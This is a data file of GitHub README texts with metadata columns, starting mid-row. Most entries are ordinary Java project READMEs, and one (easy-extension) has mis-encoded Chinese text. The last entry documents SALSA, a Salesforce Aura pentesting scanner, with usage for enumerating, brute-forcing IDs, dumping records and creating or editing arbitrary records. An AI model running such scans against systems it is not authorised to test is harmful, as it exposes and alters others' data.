              .shouldBePackagePrivate())
          .services(services -> services
              .shouldBeAnnotatedWithService()
              .shouldNotDependOnControllers()
              .namesShouldEndWithService())
          .repositories(repositories -> repositories
              .shouldBeAnnotatedWithRepository()
              .shouldNotDependOnServices()
              .namesShouldEndWithRepository()))      
      .addRule(TaikaiRule.of(...)) // Add custom ArchUnit rule here
      .build()
      .check();
}
```

## User Guide

Explore the complete [documentation](https://github.com/enofex/taikai/blob/main/docs/USERGUIDE.md) for comprehensive information on all available rules.

## Contributing

Interested in contributing? Check out our [Contribution Guidelines](https://github.com/enofex/taikai/blob/main/CONTRIBUTING.md) for details on how to get involved. Note, that we expect everyone to follow the [Code of Conduct](https://github.com/enofex/taikai/blob/main/CODE_OF_CONDUCT.md).

### What you will need

* Git
* Java 21 or higher

### Get the Source Code

Clone the repository

```shell
git clone git@github.com:enofex/taikai.git
cd taikai
```

### Build the code

To compile, test, and build

```shell
./mvnw clean package -B
```
",28,2,2,28.0,"['taikai', 'maven', 'usage', 'gradle', 'usage', 'junit', 'example', 'test', 'user', 'guide', 'contribute', 'what', 'need', 'get', 'source', 'code', 'build', 'code']","['usage', 'code', 'taikai', 'maven', 'gradle']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0
aliFetvaci61/credit-finance-application,master,"# Credit Finance Application

This project is a credit application. Users can register and log in to the application and take out credits and pay the installments of these credits.

## General Features

- Users can register
- Users can log in.
- Users take out credits
- Users can view the credits they have taken out
- Users can view the installments of credits
- Users can pay the installments of credits

## Technologies Used
- Java 17: A modern, performant, and up-to-date language used in the application.
- Spring Boot: A framework for building Spring-based applications quickly and easily.
- Docker: A containerization platform for quick deployment and running of the application.
- Kafka: A distributed messaging system used for event processing and data streaming.
- Elasticsearch: An open-source search engine used for high-performance search, analytics, and data storage.
- MySQL: A relational database management system used for data storage and management.
- PostgreSQL: A relational database management system used for data storage and management.
- Redis: An in-memory, NoSQL key/value store database management system

## Design Patterns Used
- API Gateway pattern
  - Routing
  - Transformation
  - Security
- Command Query Responsibility Segregation pattern
- Database per service pattern
- Event-Driven Architecture Pattern
- Decomposition pattern
- Security - Sensitive Data Encapsulation

# Software Architecture Design for Credit Finance Application

![image](https://github.com/user-attachments/assets/a56d549f-69b0-45ad-b9ed-974358181938)

## Installation
- make build: Builds the Docker image for the application.
- make up: Starts the application in detached mode.
- make down: Stops and removes the containers created by the application.
- make health: Builds the health-check Docker image.


## Contributing

- Fork the project.
- Create a new branch: git checkout -b new-feature
- Make your changes and commit them: git commit -am 'Add new feature'
- Push to the branch: git push origin new-feature
- Create a new Pull Request.


",0,1,1,0.0,"['credit', 'finance', 'application', 'general', 'feature', 'technology', 'use', 'design', 'pattern', 'use', 'software', 'architecture', 'design', 'credit', 'finance', 'application', 'installation', 'contribute']","['credit', 'finance', 'application', 'use', 'design']",5.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,5.0,0.0
BulPlugins/BulMultiverse,main,"<p align=""center"">
    <img src=""https://i.goopics.net/77bvma.png"" width=""256"">
</p>

BulMultiverse is an ultra-optimized lightweight world management plugin. Compatible with version 1.8 to the Latest Minecrat version. Unlike the default Multiverse-Core plugin, BulMultiverse is designed to be lean and efficient, without any unnecessary listeners.. This plugin don't contain and will never contain any listeners for any reason.
[Download page](https://www.spigotmc.org/resources/118884/ ""Click to download"")

<img src=""https://img.shields.io/badge/Table_of_contents-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

1. [Features](#features)
1. [Configuration file](#configuration-file)
2. [Commands and permissions](#commands-and-permissions)
3. [Flags](#flags)
4. [How to delete a world](#how-to-delete-a-world)
5. [Addons](#addons)
6. [Distribution](#distribution)

<img id=""features"" src=""https://img.shields.io/badge/Features-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

- Create world with customizable settings (e.g seed, difficulty, etc).
- Modify Existing World Settings (e.g, difficulty, PvP, etc).
- Teleport between world.
- Load existing world.
- List loaded worlds.
- Disable invalid world names (e.g, ""plugins"").

<img id=""configuration-file"" src=""https://img.shields.io/badge/Configuration_file-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

```
//Disable invalid world names
world_disable_name: [plugins, bStats, PluginMetrics]

messages:
  no_world_target: ""&e[BULMultiverse] &cYou didn't target any world or world name. &e/bmv help""
  world_not_found: ""&e[BULMultiverse] &cThe world &e%name% is not found. &e/bmv list""
  flag_not_found: ""&e[BULMultiverse] &cThe flag %name% don't exist. &e/bmv flags""
  forbidden_world_name: ""&e[BULMultiverse] &cYou can't create a world with this name, check your config.yml.""
  cmd_load_success: ""&e[BULMultiverse] &aworld: &2%name% &aloaded.""
  cmd_teleport_success: ""&e[BULMultiverse] &aYou are teleported to the world: &2%name%.""
  cmd_unload_success: ""&e[BULMultiverse] &aThe world: &2%name% is unload.""
  error_set_option: ""&e[BULMultiverse] &cImpossible to set this option.""
  error_world_creator: ""&e[BULMultiverse] &cThis option does not support WorldCreator.""
  help_pattern: ""&e%usage% &8| &e%description%""
  flags_pattern: ""&e%usage% &8| &e%description%""
  only_ingame_command: ""&e[BULMultiverse] &cThis command can be executed only in-game.""
  no_permission: ""&e[BULMultiverse] &cYou don't have the permission to do that""
```

<img id=""commands-and-permissions"" src=""https://img.shields.io/badge/Commands_and_permissions-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command                         | Description                                                       | Permission          |
|---------------------------------|-------------------------------------------------------------------|---------------------|
| bmv create [World Name] (Flags) | Create a world with the given name and optionals flags            | bulmultiverse.admin |
| bmv load [World Name]           | Load the target existing world                                    | bulmultiverse.admin |
| bmv unload [World Name]         | UnLoad the target existing world (This doesn't remove the folder) | bulmultiverse.admin |
| bmv set [World Name] [Flag]     | Set the flag for the target world                                 | bulmultiverse.admin |
| bmv tp [World Name]             | Teleport to the target world                                      | bulmultiverse.admin |
| bmv list                        | List all the worlds managed by BulMultiverse                      | bulmultiverse.admin |
| bmv infos (World Name)          | Display actual settings for the world                             | bulmultiverse.admin |
| bmv help                        | Display the in-game help                                          | bulmultiverse.admin |
| bmv flags                       | Display all the availables flag                                   | bulmultiverse.admin |

<img id=""flags"" src=""https://img.shields.io/badge/Flags-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command            | Description                                           | example                             |
|--------------------|-------------------------------------------------------|-------------------------------------|
| -s [Number]        | Create a world with the given seed                    | /bmv create exemple -s 15648648949  |
| -b [true or false] | Enable the default builds in the world (e.g, village) | /bmv create exemple -b false        |
| -e [Environment]   | Set the environment (e.g, nether)                     | /bmv create exemple -e the_end      |
| -p [true or false] | Enable the pvp                                        | /bmv create exemple -p false        |
| -t [Type]          | Set type (e.g, flat, amplified)                       | /bmv create exemple -t large_biomes |
| -d [Difficulty]    | Set difficulty (e.g, easy, hard)                      | /bmv create exemple -d peaceful     |

You can chain flags together, for example:
`/bmv create exemple -d peaceful -p false -t flat`

Missed a flag during creation? You can set it later using the set command:
`/bmv set exemple -d peaceful`
> NOTE
> Some flags like the seed, cannot be changed after the world is created. If you make an error in the command, such as setting an invalid difficulty:
'/bmv create exemple -d SUPERHARDCORP'
the default difficulty will be used instead. Be sure to check the console for errors when creating worlds.

<img id=""how-to-delete-a-world"" src=""https://img.shields.io/badge/How_to_delete_a_world-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

BulMultiverse does not delete server files or folders directly. To remove a world:
1. Stop your server.
2. Manually delete the world's folder.
3. Restart your server.

BulMultiverse will detect that the world folder is missing and automatically remove it from its worlds.yml file.

<img id=""addons"" src=""https://img.shields.io/badge/Addons-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

> /!\ DO NOT RENAME THE ADDONS JAR FILE, OR THE PLUGIN WILL NOT DETECT THEM

So the default BulMultiverse.jar is very light and optimized, but what if you want an additional specific feature ?

To address this, I've created a robust addons system. This means you can add a specific .jar file (for example, PerWorldInventory.jar)
to the 'addons' folder within the BulMultiverse directory, and you'll have a new feature: PerWorldInventory!

#### VoidWorld

This addon allow you to create a totally empty world. [Download page](https://www.spigotmc.org/resources/119020/ ""Click to download"")

| Type    | value     | Description                     | example                     |
|---------|-----------|---------------------------------|-----------------------------|
| flag    | -c void   | Create a empty world (void)     | /bmv create exemple -c void |
| command | /setblock | Create a block at your position | /setblock                   |

#### PerWorldInventory

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### GuiWorldManager

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### LinkPortal

This addon allow you to link nether or end portal to specific world.. [Download page](https://www.spigotmc.org/resources/119396/ ""Click to download"")

<img id=""distribution"" src=""https://img.shields.io/badge/Distribution-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

This is a public plugin. You are free to use it and create a fork to develop your own version. However you are not allowed to sell or distribute it in a private manner.",0,3,1,2.0,"['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']","['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']",1.0,[org.apache.maven.plugins:maven-shade-plugin],0.0,1.0,0.0
davidtos/LIO,master,"# LIO (Linux IO)
This repository is part of my talk about Project Panama. I aim to show how you can call C libraries from inside your Java code.

## What is inside this repository
The library contains a working example of FUSE and IO_URING with liburing. 

- **FUSE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/FuseMain.java)
  - To unmount use the following command `fusermount3 -u $FILE_PATH`
- **IO_URING READ** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringReadExample.java)
  - The read example uses polling to reduce the number of system calls.
  - To see that the polling is working you can use `sudo bpftrace -e 'tracepoint:io_uring:io_uring_submit_req* {printf(""%s(%d)\n"", comm, pid);}'` this shows you what called submit.
- **IO_URING WRITE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringWriteExample.java)
  - The write example does not use polling but makes a system call.

## Wrapper code
The code that calls the C code is generated using [Jextract](https://github.com/openjdk/jextract). Jextract creates Java code based on the header files.

To generate FUSE:
`jextract -D_FILE_OFFSET_BITS=64 -D FUSE_USE_VERSION=35 --source -d generated/src -t org.libfuse -I /Documents/libfuse-fuse-3.10.5/include/ /Documents/libfuse-fuse-3.10.5/include/fuse.h`

To generate Liburing:
`jextract -D IOURINGINLINE=extern  -l uring -t io.uring -I include --output ./generated --header-class-name liburingtest include/liburing.h`

## Side note
This sample code is not production ready, it's just a proof of concept that happens to work.
",0,0,3,0.0,"['lio', 'linux', 'io', 'what', 'inside', 'repository', 'wrapper', 'code', 'side', 'note']","['lio', 'linux', 'io', 'what', 'inside']",1.0,[],0.0,1.0,0.0
kousiknath/Concurrency,main,"## Concurrency and Multi-threading for everyone 

1. Recipe for alternate data printing (synchronization, wait-notify, volatile)
2. Recipe for rate limiting (Semaphore)
3. Recipe for counting words in a big file (Countdown Latch)
4. Recipe for Friends Outing (Cyclic Barrier)
5. Recipe for bank transaction (ReentrantLock)
6. Recipe for in-memory logging (ReadWriteLock)
7. Recipe for producer-consumer model (Lock.Condition, wait-notify)
",0,0,1,0.0,"['concurrency', 'everyone']","['concurrency', 'everyone']",1.0,[],0.0,1.0,0.0
egecanakincioglu/auth,main,"# Auth Discord Bot

### The README.md file is under development and will be published in detail soon. Stay tuned for now.",0,0,2,3.0,"['auth', 'discord', 'bot', 'the', 'file', 'development', 'publish', 'detail', 'soon', 'stay', 'tune', 'now']","['auth', 'discord', 'bot', 'the', 'file']",1.0,[],0.0,1.0,0.0
xiaoshicae/easy-extension,main,"# Easy-Extension
Easy-Extensionæ¡†æ¶ç›®æ ‡æ˜¯æé«˜`å¤æ‚ç³»ç»Ÿçš„æ‰©å±•æ€§`ï¼Œé€‚ç”¨äºç³»ç»Ÿæœ‰å¤šä¸ªæ¥å…¥æ–¹ï¼Œä¸”ä¸åŒæ¥å…¥æ–¹æœ‰å®šåˆ¶åŒ–çš„æ‰©å±•è¯‰æ±‚ã€‚ä¾‹å¦‚ç”µå•†äº¤æ˜“ï¼Œå±¥çº¦ç­‰ä¸­å°ç³»ç»Ÿã€‚

# æ¡†æ¶ç‰¹ç‚¹
* è½»é‡æ˜“ç”¨
* å¯ä»¥å®ç°ä¸šåŠ¡é€»è¾‘å’Œå¹³å°é€»è¾‘åˆ†ç¦»ï¼Œæé«˜æä¾›æ‰©å±•æ€§å’Œç¨³å®šæ€§

# æ¡†æ¶è§£å†³çš„ä¸šåŠ¡åœºæ™¯
![](/doc/target.png)

# æ¡†æ¶ä½¿ç”¨Demo
```java
@RestController
@RequestMapping(""/api"")
public class Controller {
    // åŠ¨æ€æ³¨å…¥æ‰©å±•ç‚¹1ï¼Œä¸åŒä¸šåŠ¡å’Œèƒ½åŠ›ä¼šæœ‰ä¸åŒå®ç°
    // ä¼šæ ¹æ®åŒ¹é…åˆ°çš„ä¸šåŠ¡å’ŒæŒ‚è½½çš„æ‰©å±•ç‚¹ï¼Œæ³¨å…¥ä¼˜å…ˆçº§æœ€é«˜çš„å®ç°
    // æœªåŒ¹é…åˆ°ä»»ä½•ä¸šåŠ¡å’Œèƒ½åŠ›çš„å®ç°ï¼Œä¼šèµ°é»˜è®¤èƒ½åŠ›è¿›è¡Œå…œåº•
    @ExtensionInject
    private Ext1 ext1;

    // åŠ¨æ€æ³¨å…¥æ‰©å±•ç‚¹2ï¼Œä¸åŒä¸šåŠ¡ä¼šå’Œèƒ½åŠ›æœ‰ä¸åŒå®ç°
    // ä¼šæ ¹æ®åŒ¹é…åˆ°çš„ä¸šåŠ¡å’ŒæŒ‚è½½çš„æ‰©å±•ç‚¹ï¼Œæ³¨å…¥ä¼˜å…ˆçº§æœ€é«˜çš„å®ç°
    // æœªåŒ¹é…åˆ°ä»»ä½•ä¸šåŠ¡å’Œèƒ½åŠ›çš„å®ç°ï¼Œä¼šèµ°é»˜è®¤èƒ½åŠ›è¿›è¡Œå…œåº•
    @ExtensionInject
    private Ext2 ext2;

    // åŠ¨æ€æ³¨å…¥æ‰©å±•ç‚¹3ï¼Œä¸åŒä¸šåŠ¡ä¼šå’Œèƒ½åŠ›æœ‰ä¸åŒå®ç°
    // ä¼šæ ¹æ®åŒ¹é…åˆ°çš„ä¸šåŠ¡å’ŒæŒ‚è½½çš„æ‰©å±•ç‚¹ï¼Œæ³¨å…¥æ‰€æœ‰åŒ¹é…åˆ°çš„å®ç°
    // åŒ…æ‹¬é»˜è®¤èƒ½åŠ›
    @ExtensionInject
    private List<Ext3> ext3List;

    @RequestMapping(""/process"")
    public String process() {
        String s1 = ext1.doSomething1();
        String s2 = ext2.doSomething2();
        List<String> s3List = new ArrayList<>();
        for (Ext3 ext3 : ext3List) {
            s3List.add(ext3.doSomething3());
        }
        return String.format(""res: ext1 = %s, ext2 = %s, ext3List = %s"", s1, s2, Arrays.toString(s3List));
    }
}
```

# æ–‡æ¡£
* å®Œæ•´æ–‡æ¡£è¯·å‚è€ƒ: [wiki](https://github.com/xiaoshicae/easy-extension/wiki)
* goç‰ˆæœ¬çš„easy-extensionå®ç°å¯ä»¥å‚è€ƒ: [go-easy-extension](https://github.com/xiaoshicae/go-easy-extension)

# ä»£ç æ ·ä¾‹
æ ·ä¾‹æºç è¯·å‚è€ƒ: [easy-extension-sample](https://github.com/xiaoshicae/easy-extension-sample)

# License
Easy-Extensionéµå¾ªApacheå¼€æºåè®®ï¼Œå…·ä½“å†…å®¹è¯·å‚è€ƒLICENSEæ–‡ä»¶ã€‚
",2,0,4,10.0,['license'],['license'],3.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0
cosad3s/salsa,main,"# SALSA - *SALesforce Scanner for Aura (and beyond)*

<p align=""center"">
<img src=""./assets/logo.jpeg"" width=""150"">

**SALSA** has been developped on a lot of my personal free time, to help me on pentesting and bug hunting activites against Salesforce Lightning (Aura) and API assets. Please note it is fully experimental.

I decided to share it for free, to help the community.  
*If you would ever like to buy me a coffee or a beer* ğŸ˜‡ :

[![""Buy Me A Coffee""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/cosades)  

</p>

## Features

- Enumeration and/or dump data records (*and sub-records*) from:
  - Aura controllers
  - Services API (Direct sObjects `/services/data/v60.0/sobjects` or SOQL `/services/data/v60.0/query/`)
  - SOAP (`/services/Soap/c/`)
- Works as unauthenticated or authenticated user (*username / password or `sid` or `aura.token`*).
- Enumeration records entities types (with or without custom entities `*__c` filtering) from:  
  - Target APIs harvesting
  - And/or Salesforce packages reflections
  - And/or encountered entities in the wild
- Test for targetted record identifier.
- Bruteforcing record identifiers.
- âš ï¸ Automatized test for arbitrary records creation.
- âš ï¸ Automatized test for arbitrary records fields edition.
- *And more: routing to HTTP proxy for investigation, custom User-Agent, automatized finding of entities fields, auto-detect FWUID, etc.*

âš ï¸: *dangerous & experimental*

## Usage

### Help

```bash
usage: SALSA ğŸ’ƒâš¡ - SALesforce Scanner for Aura (and beyond)
       [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [--sid SID] [--token TOKEN] [--path PATH] [--id ID] [--bruteforce] [--types TYPES] [--update] [--create] [--ua UA] [--proxy PROXY] [--dump]
       [--output OUTPUT] [--typesintrospection] [--typeswordlist] [--typesapi] [--custom] [--app APP] [--force] [--debug] [--trace]

Enumeration of vulnerabilities and misconfiguration against Salesforce endpoint.

named arguments:
  -h, --help             show this help message and exit
  -t TARGET, --target TARGET
                         Target URL
  -u USERNAME, --username USERNAME
                         Username (for authenticated mode)
  -p PASSWORD, --password PASSWORD
                         Password (for authenticated mode)
  --sid SID              The SID cookie value (for authenticated mode - instead of username/password)
  --token TOKEN          The aura token (for authenticated mode - instead of username/password)
  --path PATH            Set specific base path.
  --id ID                Find a specific record from its id.
  --bruteforce           Enable bruteforce of Salesforce identifiers from a specific record id (from --recordid). (default: false)
  --types TYPES          Target record(s) only from following type(s) (should be comma-separated).
  --update               Test for record fields update permissions (WARNING: will inject data in the app!). (default: false)
  --create               Test for record creation permissions (WARNING: will inject data in the app!). (default: false)
  --ua UA                Set specific User-Agent.
  --proxy PROXY          Use following HTTP proxy (ex: 127.0.0.1:8080).
  --dump                 Dump records as Json files. (default: false)
  --output OUTPUT        Output folder for dumping records as Json files.
  --typesintrospection   Use record types from Salesforce package introspection. (default: false)
  --typeswordlist        Use record types from internal wordlist. (default: false)
  --typesapi             Use record types from APIs on the target. (default: false)
  --custom               Only target custom record types (*__c). (default: false)
  --app APP              Custom AURA App Name.
  --force                Continue the scanning actions even if in case of incoherent or incorrect results. (default: false)
  --debug                Increase the log level to DEBUG mode. (default: false)
  --trace                Increase the log level to TRACE mode. (default: false)
```

### Examples

<details>
    <summary>Simple scan - Unauthenticated</summary>

```bash
java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Aura: looking for records for type AINaturalLangProcessRslt
[*] Aura: looking for records for type AINtrlLangProcChunkRslt
[*] Aura: looking for records for type AIPredictionScore
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Custom types only</summary>

```bash
â¯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Reducing to 4 custom object types.
[*] Aura: looking for records for type CountryLanguage__c
[*] Looking for sObject with recordId 00B0H000007t1qlUAA and type(s) [ListView].
[!] The recordId 00B0H000007t1qlUAA cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.).
[!] No records found from recordId 00B0H000007t1qlUAA and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={ListView={_nameField=Name, _entityLabel=List View, _keyPrefix=00B}}, quickActionRecordTemplates={}, recordErrors={00B0H000007t1qlUAA={message=We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={00B0H000007t1qlUAA=[00B0H000007t1qlUAA.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Aura: looking for records for type Country__c
[*] Looking for sObject with recordId 00B0H000007t1qgUAA and type(s) [ListView].
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Targetted record type and bruteforce</summary>

```bash
â¯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types Store__History --id 0176S0001GvGwvEQQS --bruteforce
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for sObject with recordId 0176S0001GvGwvMQQS and type(s) [Store__History].
[!] Cannot find fields for object type Store__History through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[!] Cannot find record with fields for ID 0176S0001GvGwvMQQS and type Store__History.
[!] The recordId 0176S0001GvGwvMQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvMQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvMQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvMQQS=[0176S0001GvGwvMQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvNQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvNQQS and type Store__History.
[!] The recordId 0176S0001GvGwvNQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvNQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvNQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvNQQS=[0176S0001GvGwvNQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvLQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvLQQS and type Store__History.
[!] The recordId 0176S0001GvGwvLQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvLQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvLQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvLQQS=[0176S0001GvGwvLQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvKQQS and type(s) [Store__History].
(...)
```

</details>

<details>
    <summary>Simple scan - Authenticated - Targetted record type</summary>

```bash
â¯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types User --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED""
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with type(s) [User].
[*] Aura: looking for records for type User
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJdm.REDACTED
[*] Looking for sObject with recordId 005ixxxxx and type(s) [User].
[*] Found 190 fields for sObject type User from Aura service.
[*] Found record 005ixxxxxx with descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord!
[*] 1 object(s) retrieved with descriptor serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems from object type User!
[*] End of scanning of https://www.target.com
```

</details>

<details>
    <summary>Simple scan - Authenticated - Custom record types dump</summary>

```bash
â¯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED"" --dump --proxy 127.0.0.1:8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJ...REDACTED
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Found 279 object types from Salesforce REST sObject API!
[*] Reducing to 24 custom object types.
[*] Aura: looking for records for type MyOtherType__c
[*] SOAP: looking for records for type MyOtherType__c
[*] Found 0 entities of types MyOtherType__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherType__c
[*] SObject Data API: looking for records for type MyOtherType__c
[*] Aura: looking for records for type Wonderful__c
[*] SOAP: looking for records for type Wonderful__c
[*] Found 0 entities of types Wonderful__c through SOAP API!
[*] Query Data API: looking for records for type Wonderful__c
[*] SObject Data API: looking for records for type Wonderful__c
[*] Aura: looking for records for type MyOtherTypeAgain__c
[*] SOAP: looking for records for type MyOtherTypeAgain__c
[*] Found 0 entities of types MyOtherTypeAgain__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherTypeAgain__c
[*] SObject Data API: looking for records for type MyOtherTypeAgain__c
[*] Aura: looking for records for type MyType__c
[*] SOAP: looking for records for type MyType__c
[*] Found 10 entities of types MyType__c through SOAP API!
[*] Looking for sObject with recordId a4AREDACTED and type(s) [MyType__c].
[!] Cannot find fields for object type MyType__c through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[*] Found 29 fields for sObject type MyType__c from REST sObject API.
[!] Cannot find record with fields for ID a4AREDACTED and type MyType__c.
[!] The recordId a4AREDACTED cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId a4AREDACTED and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={a4AREDACTED={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={a4AREDACTED=[a4AREDACTED.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Found sObject a4AREDACTED of type MyType__c from REST sObject API: [MyType__c]{[[StartDateTime__c=2023-12-05T18:00:00.000+0000], [CreatedDate=2023-11-28T14:07:00.000+0000],....]}
[*] Looking for sObject with recordId a4A6REDACTED and type(s) [MyType__c].
[!] Cannot find record with fields for ID a4A6REDACTED and type MyType__c.
(...)
[*] Query Data API: looking for records for type TR_MyLV_Diamond__c
[*] SObject Data API: looking for records for type TR_MyLV_Diamond__c
[*] Will dump merged object a4AREDACTED to ./output2024.07.22.21.57.00/MyType__c/a4AREDACTED.json
[*] Will dump merged object a2RREDACTED to ./output2024.07.22.21.57.00/MyOtherType__c/a2RREDACTED.json
[*] Will dump merged object a0NREDACTED to ./output2024.07.22.21.57.00/MyOtherTypeAgain__c/a0NREDACTED.json
(...)
```

**Dumped records will be stored into a timestamped output folder**

</details>

## Current limitations

- SOAP `query` requests are limited to 10 items.
- Bruteforcing IDs is limited to 10 items.

## TODO

*Release date: maybe one day*

- [ ] Find & add alternatives authentications.
- [ ] Detect `debug` mode arbitrary activation ([https://www.cosades.com/posts/sf_debug_mode](https://www.cosades.com/posts/sf_debug_mode)).  
